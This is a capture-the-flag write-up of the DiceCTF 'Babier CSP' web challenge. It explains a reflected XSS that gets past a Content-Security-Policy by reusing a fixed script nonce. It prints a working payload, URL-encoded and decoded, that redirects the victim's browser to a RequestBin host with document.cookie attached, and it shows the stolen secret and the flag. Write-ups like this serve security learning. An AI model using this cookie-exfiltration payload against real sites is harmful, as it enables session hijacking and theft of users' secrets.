# Babier CSP - (349 Solves/107 Points)

```
Baby CSP was too hard for us, try Babier CSP.

babier-csp.dicec.tf #Challenge site

https://us-east1-dicegang.cloudfunctions.net/ctf-2021-admin-bot?challenge=babier-csp #Admin bot
The admin will set a cookie secret equal to config.secret in index.js. 
```

We are given an `index.js` which contains the source code for the NodeJS backend. This challenge hints quite strongly at **XSS** since we have to **steal a cookie** which has the **location of config.secret** `app.use('/' + SECRET, express.static(__dirname + "/secret"));` and presumably contains the flag.

The webpage is fairly simple, with a "`View Fruit`" link that chooses from 1 of the 4 fruits `"apple", "orange", "pineapple", "pear`, passes it through a **GET request** and renders it on the page itself as part of `${name}`.

```html
const template = name => `
<html>

${name === '' ? '': `<h1>${name}</h1>`}
<a href='#' id=elem>View Fruit</a>

<script nonce=${NONCE}>
elem.onclick = () => {
  location = "/?name=" + encodeURIComponent(["apple", "orange", "pineapple", "pear"][Math.floor(4 * Math.random())]);
}
</script>

</html>
`;
```

We quickly realise that we can put **any HTML into `${name}`**, and hence this is vulnerable to **XSS**.

However, there is also a **`nonce`** which complicates things slightly, since **only script tags which have `nonce` will be allowed to run**, and **inline running of JS is disabled**. Thankfully, the `nonce` is a **constant**: `const NONCE = crypto.randomBytes(16).toString('base64');` and we can very easily extract the nonce from the page source:

```
nonce-LRGWAXOY98Es0zz0QOVmag==
```

But, there is yet another measure we need to resolve: the **Content-Security-Policy (CSP)**.

```javascript
res.setHeader("Content-Security-Policy", `default-src none; script-src 'nonce-${NONCE}';`);
```

When we try to run any fetch statements, we will realise that `default-src none;` **blocks any fetch**. However, one way to circumvent this is to use `location.href` instead to **redirect the user along with the cookie**. Hence, our payload will look something like this:

```bash
https://babier-csp.dicec.tf/?name=%3Cscript%20nonce=LRGWAXOY98Es0zz0QOVmag==%3Elocation.href=%22https://requestbin.io/1lb35x71?data=%22%2Bdocument.cookie%3C/script%3E
#URL-Encoded

#URL-Decoded
https://babier-csp.dicec.tf/?name=<script nonce=LRGWAXOY98Es0zz0QOVmag==>location.href="https://requestbin.io/1lb35x71?data="+document.cookie</script>
```



Sending this via the `Admin Bot`, we get the cookie in our RequestBin:

```
secret=4b36b1b8e47f761263796b1defd80745
```

Visiting the site `https://babier-csp.dicec.tf/4b36b1b8e47f761263796b1defd80745/`, we get the flag in the source code:

```html
<!-- 

I'm glad you made it here, there's a flag!

<b>dice{web_1s_a_stat3_0f_grac3_857720}</b>

If you want more CSP, you should try Adult CSP.

-->
```

